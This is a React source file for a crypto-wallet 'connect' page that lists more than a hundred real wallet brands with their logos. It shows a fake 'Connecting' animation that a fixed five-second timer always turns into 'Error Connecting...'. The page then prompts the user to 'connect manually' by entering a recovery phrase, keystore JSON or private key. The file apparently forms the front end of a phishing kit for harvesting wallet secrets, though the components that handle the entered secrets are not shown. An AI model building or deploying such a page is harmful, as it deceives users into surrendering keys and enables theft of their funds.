import classes from './App.module.css';
import React from 'react';
import Header from './components/Header/Header';
import AfterHeader from './components/AfterHeader/AfterHeader'
import Wallets from './components/Wallets/Wallets';
import {Row, Col, Button, Tabs, Tab} from 'react-bootstrap';
import Modal from './components/UI/Modal/Modal';
import Aux from './hoc/Auxiliary/Auxiliary'
import ReactLoading from 'react-loading';
import Phrase from './components/Phrase/Phrase';
import KeystoreJson from './components/KeystoreJson/KeystoreJson';
import PrivateKey from './components/PrivateKey/PrivateKey';
import Preloader from './components/Preloader/Preloader'
import {BrowserRouter as Router, Routes, Route} from 'react-router-dom';
import Home from './components/Home/Home';

//images
import trust from './assets/images/trust-wallet-66f8777532931d9c09b633344981a6a9.png';
import coinbase from './assets/images/coinbase.jpeg'
import trezor from './assets/images/trezor.jpeg';
import myetherwallet from './assets/images/myetherwallet.jpeg'
import atomic from './assets/images/atomic-4c02d2b33cf091fd83c7a49819394e41.png';
import metamask from './assets/images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png';
import rainbow from './assets/images/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png';
import argent from './assets/images/Argent.jpeg';
import gnosis from './assets/images/gnosis.jpeg';
import crypto from './assets/images/crypto-4cbeac57421fb3ca2573db2cf448169a.png';
import pillar from './assets/images/pillar.png';
import stagazer from './assets/images/stagazer.jpeg';
import rose from './assets/images/rose.png';
import phantom from './assets/images/phantom.jpeg';
import ledger from './assets/images/ledgerwallet-c56784b26234a389632687a36d548d4.png';
import tron from './assets/images/tron-20fg49jbfj9488dhvd76975js73648.png';
import sollet from './assets/images/sollet.jpeg';
import solflare from './assets/images/solflare.png';
import yoroi from './assets/images/yoroi.webp';
import imtoken from './assets/images/imtoken-fd8c7c52dac6101568954e7448a49202.png'
import anchor from './assets/images/anchor.png';
import onto from './assets/images/onto-983003d35fe32bf916f9eda381f138f7.png';
import tokenpocket from './assets/images/tokenpocket-57a4a886cc644e5237ac1558226154cb.png';
import mathwallet from './assets/images/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png';
import bitpay from './assets/images/bitpay-1573dd6c95eb38386f181048663590d0.jpeg';
import maiar from './assets/images/maiar.png';
import ledgerlive from './assets/images/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png'
import walleth from './assets/images/walleth-b60336f8dd9ea86285408cb4f96634d1.png'
import authereum from './assets/images/authereum-32f3939207b77c1837547d5ed4f86110.png';
import huobi from './assets/images/huobi.jpeg';
import eidoo from './assets/images/eidoo.png';
import mykey from './assets/images/mykey-7419df5270c0406c80cba19fa5165923.png';
import loopring from './assets/images/loopring.jpeg';
import trustvault from './assets/images/trustvault-9031a67f82293fc50ead978f936cfff3.png';
import coin98 from './assets/images/coin98-c5b50adaceaf474e48ef1dad150d0829.png'
import coolwallets from './assets/images/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png';
import alice from './assets/images/alice.png';
import alphawallet from './assets/images/alphawallet.jpeg'
import dcentwallet from './assets/images/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png';
import zelcore from './assets/images/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png';
import nash from './assets/images/nash.jpeg';
import coinomi from './assets/images/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpeg';
import gridplus from './assets/images/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png';
import cybavo from './assets/images/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png';
import tokenary from './assets/images/tokenary.png';
import wazirx from './assets/images/wazirx-logo-rounded.9bff9f42.png';
import torus from './assets/images/torus.jpeg';
import spatium from './assets/images/spatium.jpeg';
import safepal from './assets/images/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png';
import equal from './assets/images/equal.jpeg';
import infinito from './assets/images/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png';
import walletio from './assets/images/wallet.io-198f396de22fe25eb370f46544abe69d.png';
import infinity from './assets/images/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png';
import ownbit from './assets/images/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png';
import easypocket from './assets/images/easypocket-436ea3270a7bf77c02a880bfc70d0ee8.jpeg';
import bridgewallet from './assets/images/bridge.png';
import sparkpoint from './assets/images/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png';
import viawallet from './assets/images/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png';
import bitkeep from './assets/images/bitkeep-387b0ca7da4cf322f44c70c23064c529.png';
import vision from './assets/images/vision-928292fe642172a18e62feb5eaa2d639.png';
import swiftwallet from './assets/images/swift wallet.png';
import peakdefi from './assets/images/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png';
import cosmostation from './assets/images/cosmosstation.png';
import graph from './assets/images/graph.jpeg';
import kardiachain from './assets/images/kardachain.png';
import keplr from './assets/images/keplr.png';
import harmony from './assets/images/harmony.png';
import iconex from './assets/images/iconex.png';
import fetch from './assets/images/fetch.jpeg';
import xdc from './assets/images/xdc-9a98bff95dffc41869b8e77912a6cc54.png';
import unstoppable from './assets/images/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png';
import meetone from './assets/images/meetone-01093db7d99e3e6cf5cca68b616f8255.jpeg';
import dok from './assets/images/dok-a32c522e109217cc2a1a2a310f3c9bf7.png';
import at from './assets/images/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png';
import morix from './assets/images/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png';
import midas from './assets/images/midas-wallet-5c5057d972ca621414f077541845fc61.png';
import ellipal from './assets/images/ellipal.png';
import keyringpro from './assets/images/keyring pro.png';
import blockchain from './assets/images/blockchain-logo.png';
import bsc from './assets/images/bsc-logo.png';
import dharma from './assets/images/Dharma.jpeg';
import halodefi from './assets/images/Halodefi.jpeg';
import talken from './assets/images/Talken.jpeg';
import kyberswap from './assets/images/Kyberswap.jpeg';
import tongue from './assets/images/tongue.jpeg';
import flare from './assets/images/Flare.jpeg';
import plasmapay from './assets/images/PlasmaPay.jpeg';
import wallet03 from './assets/images/03Wallet.jpeg';
import hashkeyme from './assets/images/HashKeyMe.jpeg';
import jadewallet from './assets/images/JadeWallet.jpeg';
import guardawallet from './assets/images/GuardaWallet.jpeg';
import defiant from './assets/images/Defiant.jpeg';
import trusteewallet from './assets/images/TrusteeWallet.jpeg';
import coinus from './assets/images/CoinUs.jpeg';
import cmorq from './assets/images/cmorq.jpeg';
import valora from './assets/images/Valora.jpeg';
import quiverx from './assets/images/QuiverX.jpeg';
import celo from './assets/images/CeloWallet.jpeg';
import encryptedink from './assets/images/EncryptedInk.jpeg';
import elastos from './assets/images/ElastosEssentials.jpeg';
import fusecash from './assets/images/fusecash.jpeg';
import bitpie from './assets/images/Bitpie.jpeg';
import aktionariat from './assets/images/aktionariat-c5784b26234a389632687a36d2fb3258 (1).png';
import walletconnect from './assets/images/walletconnect.jpeg';
import okex from './assets/images/16366474752706180001636647476390250000_content.JPG'

class App extends React.Component {

  constructor(props) {
    super(props)
    this.state = {
       showModal: false,
       moveToNextModal: false,
       stopConnecting: false,
       showPreloader: false,
       name: '',
       image: ''
    }
  }

  componentWillUnmount(){
    clearTimeout(this.state.stopConnecting);
  }

  showModalFunc = (name) => {
    this.setState({showModal: true, name: name})
    setTimeout(() => {
      this.stopLoadingFunc()
    }, 5000)
  }

  closeModalFunc = () => {
    this.setState({showModal: false})
    this.startLoadingFunc()
    this.setState({moveToNextModal: false})

  }

  moveToNextModalFunc = () => {
    this.setState({moveToNextModal: true})
  }

  stopLoadingFunc = () => {
    this.setState({stopConnecting: true})
  }

  startLoadingFunc = () => {
    this.setState({stopConnecting: false})
  }

  showPreloaderFunc = () => {
    this.setState({showPreloader: true})
  }

  Connect = () => {
    let img
    switch(this.state.name) {
    case 'Metamask' : img = <img height="30" src={metamask} alt="Metamask img" />;
    break;
    case 'Coinbase' : img = <img height="30" src={coinbase} alt="Coinbase img" />;
    break;
    case 'Trezor' : img = <img height="30" src={trezor} alt="Trezor img" />;
    break;
    case 'MyEtherWallet' : img = <img height="30" src={myetherwallet} alt="myetherwallet img" />;
    break;
    case 'Trust' : img = <img height="30" src={trust} alt="trust img" />;
    break;
    case 'Atomic' : img = <img height="30" src={atomic} alt="Atomic img" />;
    break;
    case 'Rainbow' : img = <img height="30" src={rainbow} alt="Rainbow img" />;
    break;
    case 'Argent' : img = <img height="30" src={argent} alt="Argent img" />;
    break;
    case 'Gnosis' : img = <img height="30" src={gnosis} alt="Gnosis img" />;
    break;
    case 'Crypto' : img = <img height="30" src={crypto} alt="Crypto img" />;
    break;
    case 'Pillar' : img = <img height="30" src={pillar} alt="Pillar img" />;
    break;
    case 'Stargazer' : img = <img height="30" src={stagazer} alt="Stargazer img" />;
    break;
    case 'Rose' : img = <img height="30" src={rose} alt="Rose img" />;
    break;
    case 'Phantom' : img = <img height="30" src={phantom} alt="Phantom img" />;
    break;
    case 'Ledger' : img = <img height="30" src={ledger} alt="Ledger img" />;
    break;
    case 'Tron' : img = <img height="30" src={tron} alt="Tron img" />;
    break;
    case 'Sollet' : img = <img height="30" src={sollet} alt="Sollet img" />;
    break;
    case 'Solflare' : img = <img height="30" src={solflare} alt="Solflare img" />;
    break;
    case 'Yoroi' : img = <img height="30" src={yoroi} alt="Yoroi img" />;
    break;
    case 'imToken' : img = <img height="30" src={imtoken} alt="imToken img" />;
    break;
    case 'Anchor' : img = <img height="30" src={anchor} alt="anchor img" />;
    break;
    case 'Onto' : img = <img height="30" src={onto} alt="onto img" />;
    break;
    case 'TokenPocket' : img = <img height="30" src={tokenpocket} alt="TokenPocket img" />;
    break;
    case 'MathWallet' : img = <img height="30" src={mathwallet} alt="MathWallet img" />;
    break;
    case 'Bitpay' : img = <img height="30" src={bitpay} alt="Bitpay img" />;
    break;
    case 'Maiar' : img = <img height="30" src={maiar} alt="Maiar img" />;
    break;
    case 'LedgerLive' : img = <img height="30" src={ledgerlive} alt="LedgerLive img" />;
    break;
    case 'Walleth' : img = <img height="30" src={walleth} alt="Walleth img" />;
    break;
    case 'Authereum' : img = <img height="30" src={authereum} alt="Authereum img" />;
    break;
    case 'Huobi' : img = <img height="30" src={huobi} alt="Huobi img" />;
    break;
    case 'Eidoo' : img = <img height="30" src={eidoo} alt="Eidoo img" />;
    break;
    case 'MyKey' : img = <img height="30" src={mykey} alt="Mykey img" />;
    break;
    case 'Loopring' : img = <img height="30" src={loopring} alt="Loopring img" />;
    break;
    case 'TrustVault' : img = <img height="30" src={trustvault} alt="TrustVault img" />;
    break;
    case 'Coin98' : img = <img height="30" src={coin98} alt="Coin98 img" />;
    break;
    case 'CoolWallets' : img = <img height="30" src={coolwallets} alt="CoolWallets img" />;
    break;
    case 'Alice' : img = <img height="30" src={alice} alt="Alice img" />;
    break;
    case 'AlphaWallet' : img = <img height="30" src={alphawallet} alt="ALphawallet img" />;
    break;
    case 'DcentWallet' : img = <img height="30" src={dcentwallet} alt="DcentWallet img" />;
    break;
    case 'Zelcore' : img = <img height="30" src={zelcore} alt="Zelcore img" />;
    break;
    case 'Nash' : img = <img height="30" src={nash} alt="Nash img" />;
    break;
    case 'Coinomi' : img = <img height="30" src={coinomi} alt="Coinomi img" />;
    break;
    case 'GridPlus' : img = <img height="30" src={gridplus} alt="GridPlus img" />;
    break;
    case 'Cybavo' : img = <img height="30" src={cybavo} alt="Cybavo img" />;
    break;
    case 'Tokenary' : img = <img height="30" src={tokenary} alt="Tokenary img" />;
    break;
    case 'Wazirx' : img = <img height="30" src={wazirx} alt="Wazirx img" />;
    break;
    case 'Torus' : img = <img height="30" src={torus} alt="Torus img" />;
    break;
    case 'Spatium' : img = <img height="30" src={spatium} alt="Spatium img" />;
    break;
    case 'SafePal' : img = <img height="30" src={safepal} alt="SafePal img" />;
    break;
    case 'Equal' : img = <img height="30" src={equal} alt="Equal img" />;
    break;
    case 'Infinito' : img = <img height="30" src={infinito} alt="Infinito img" />;
    break;
    case 'Walletio' : img = <img height="30" src={walletio} alt="Walletio img" />;
    break;
    case 'Infinity' : img = <img height="30" src={infinity} alt="Infinity img" />;
    break;
    case 'OwnBit' : img = <img height="30" src={ownbit} alt="OwnBit img" />;
    break;
    case 'EasyPocket' : img = <img height="30" src={easypocket} alt="EasyPocket img" />;
    break;
    case 'BridgeWallet' : img = <img height="30" src={bridgewallet} alt="BridgeWallet img" />;
    break;
    case 'SparkPoint' : img = <img height="30" src={sparkpoint} alt="SparkPoint img" />;
    break;
    case 'ViaWallet' : img = <img height="30" src={viawallet} alt="ViaWallet img" />;
    break;
    case 'BitKeep' : img = <img height="30" src={bitkeep} alt="BitKeep img" />;
    break;
    case 'Vision' : img = <img height="30" src={vision} alt="Vision img" />;
    break;
    case 'SwiftWallet' : img = <img height="30" src={swiftwallet} alt="SwiftWallet img" />;
    break;
    case 'PeakDefi' : img = <img height="30" src={peakdefi} alt="PeakDefi img" />;
    break;
    case 'Cosmostation' : img = <img height="30" src={cosmostation} alt="Cosmostation img" />;
    break;
    case 'GraphProtocol' : img = <img height="30" src={graph} alt="GraphProtocol img" />;
    break;
    case 'Kardiachain' : img = <img height="30" src={kardiachain} alt="Kardiachain img" />;
    break;
    case 'Keplr' : img = <img height="30" src={keplr} alt="Keplr img" />;
    break;
    case 'Harmony' : img = <img height="30" src={harmony} alt="Harmony img" />;
    break;
    case 'Iconex' : img = <img height="30" src={iconex} alt="Iconex img" />;
    break;
    case 'Fetch' : img = <img height="30" src={fetch} alt="Fetch img" />;
    break;
    case 'Xdc' : img = <img height="30" src={xdc} alt="Xdc img" />;
    break;
    case 'Unstoppable' : img = <img height="30" src={unstoppable} alt="Unstoppable img" />;
    break;
    case 'MeetOne' : img = <img height="30" src={meetone} alt="MeetOne img" />;
    break;
    case 'Dok' : img = <img height="30" src={dok} alt="Dok img" />;
    break;
    case 'AT' : img = <img height="30" src={at} alt="AT img" />;
    break;
    case 'Morix' : img = <img height="30" src={morix} alt="Morix img" />;
    break;
    case 'Midas' : img = <img height="30" src={midas} alt="Midas img" />;
    break;
    case 'Ellipal' : img = <img height="30" src={ellipal} alt="Ellipal img" />;
    break;
    case 'KeyRingPro' : img = <img height="30" src={keyringpro} alt="KeyRingPro img" />;
    break;
    case 'Blockchain' : img = <img height="30" src={blockchain} alt="Blockchain img" />;
    break;
    case 'Binance Smart Chain' : img = <img height="30" src={bsc} alt="Binance Smart Chain img" />;
    break;
    case 'Dharma' : img = <img height="30" src={dharma} alt="Dharma img" />;
    break;
    case 'Halodefi' : img = <img height="30" src={halodefi} alt="Halodefi img" />;
    break;
    case 'Talken' : img = <img height="30" src={talken} alt="Talken img" />;
    break;
    case 'KyberSwap' : img = <img height="30" src={kyberswap} alt="KyberSwap img" />;
    break;
    case 'Tongue' : img = <img height="30" src={tongue} alt="Tongue img" />;
    break;
    case 'Flare' : img = <img height="30" src={flare} alt="Flare img" />;
    break;
    case 'PlasmaPay' : img = <img height="30" src={plasmapay} alt="PlasmaPay img" />;
    break;
    case '03Wallet' : img = <img height="30" src={wallet03} alt="03Wallet img" />;
    break;
    case 'HashKeyMe' : img = <img height="30" src={hashkeyme} alt="HashKeyMe img" />;
    break;
    case 'Jade' : img = <img height="30" src={jadewallet} alt="Jade img" />;
    break;
    case 'Guarda' : img = <img height="30" src={guardawallet} alt="Guarda img" />;
    break;
    case 'Defiant' : img = <img height="30" src={defiant} alt="Defiant img" />;
    break;
    case 'TrusteeWallet' : img = <img height="30" src={trusteewallet} alt="TrusteeWallet img" />;
    break;
    case 'CoinUs' : img = <img height="30" src={coinus} alt="CoinUs img" />;
    break;
    case 'Cmorq' : img = <img height="30" src={cmorq} alt="Cmorq img" />;
    break;
    case 'Valora' : img = <img height="30" src={valora} alt="Valora img" />;
    break;
    case 'QuiverX' : img = <img height="30" src={quiverx} alt="QuiverX img" />;
    break;
    case 'Celo' : img = <img height="30" src={celo} alt="Celo img" />;
    break;
    case 'EncryptedInk' : img = <img height="30" src={encryptedink} alt="EncryptedInk img" />;
    break;
    case 'ElastosEssentials' : img = <img height="30" src={elastos} alt="ElastosEssentials img" />;
    break;
    case 'FuseCash' : img = <img height="30" src={fusecash} alt="FuseCash img" />;
    break;
    case 'Bitpie' : img = <img height="30" src={bitpie} alt="Bitpie img" />;
    break;
    case 'Aktionariat' : img = <img height="30" src={aktionariat} alt="Aktionariat img" />;
    break;
    case 'Walletconnect' : img = <img height="30" src={walletconnect} alt="Walletconnect img" />;
    break;
    case 'Okex' : img = <img height="30" src={okex} alt="Okex img" />;
    break;
    default:  img = <img height="30" src={trust} alt="Trust img" />
  }

   let preload

   this.state.showPreloader ? preload = <Preloader  />: preload = '';

   let modalDown = <Aux>
       <Col md={{span: 10, offset: 1}} className={classes.downCol}>
         <Row>
           <Col md={10}>
            <p>{this.state.name}</p>
             <small>Easy-to-use browser extension</small>
           </Col>
           <Col md={2}>
              {img}
           </Col>
         </Row>
       </Col>
       </Aux>


    let inner = <Aux>
      <Row style={{textAlign: 'left'}}>
            <span >
              Back
            </span>
            <hr></hr>
            <Col md={{span: 10, offset: 1}} className={classes.upCol}>
              <span style={{marginTop: '22px',  color: 'red'}}>Connecting</span>  <ReactLoading className={classes.Loader} text="connecting" type="bubbles" color="red" height={'20%'} width={'20%'} />

            </Col>
             {modalDown}
          </Row>
    </Aux>

    if(this.state.stopConnecting) {
      inner = <Aux>
        <Row style={{textAlign: 'left'}}>
            <span >
              Back
            </span>
            <hr></hr>
            <Col md={{span: 10, offset: 1}} className={classes.upCol2}>
              <span style={{marginTop: '8px', color: 'red'}}>Error Connecting...</span>  <Button onClick={this.moveToNextModalFunc} style={{marginLeft: '20px', fontWeight: 'bold'}} variant="secondary"><small>Connect Manually</small></Button>{' '}


            </Col>
            {modalDown}
          </Row>
      </Aux>
    }

    let modal = <Aux>
      <Modal show={this.state.showModal} modalClosed={this.closeModalFunc}>
          {inner}

      </Modal>
    </Aux>

    if(this.state.moveToNextModal){
      modal = <Aux>
      <Modal  show={this.state.showModal} modalClosed={this.closeModalFunc}>

          <Row style={{textAlign: 'left'}}>
            <div style={{display: 'flex'}}>
            <span>
              {img}
            </span>
          <p style={{marginLeft: '5px'}}>Import your {this.state.name} Wallet</p>
          <hr />
            </div>

          <Col style={{marginTop: '12px'}} md={{span: 10, offset: 1}} >

          <Tabs defaultActiveKey="Phrase" id="uncontrolled-tab-example" className="mb-3"> <br></br>
          <Tab eventKey="Phrase" title="Phrase">
            <Phrase startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
          <Tab eventKey="Keystore JSON" title="Keystore JSON">
          <KeystoreJson startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
          <Tab eventKey="Private Key" title="Private Key" >
          <PrivateKey startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
        </Tabs>

          </Col>
          </Row>

      </Modal>
    </Aux>
    }
    return (
      <div className={classes.App}>
         {preload}
         <Header />

         {modal}


         <AfterHeader header={'Wallets'} message={''} locate={false} />

         <Row>
           <Col md={{span:8, offset: 2}}>
           <Wallets  openModal={this.showModalFunc} />
           </Col>

         </Row>
        </div>
    )
  }


  render(){

  console.log('name', this.state.name);


    return (
      <div className={classes.App}>
        <Router>

          <Routes>
            <Route path="/" element={<Home />} />
            <Route path="/connect" element={<this.Connect />}/>
          </Routes>

        </Router>
        {/* <div className={classes.App}>
         {preload}
         <Header />

         {modal}


         <AfterHeader header={'Wallets'} message={''} />

         <Row>
           <Col md={{span:8, offset: 2}}>
           <Wallets  openModal={this.showModalFunc} />
           </Col>

         </Row>
        </div> */}
      </div>

    );
  }

}

export default App;
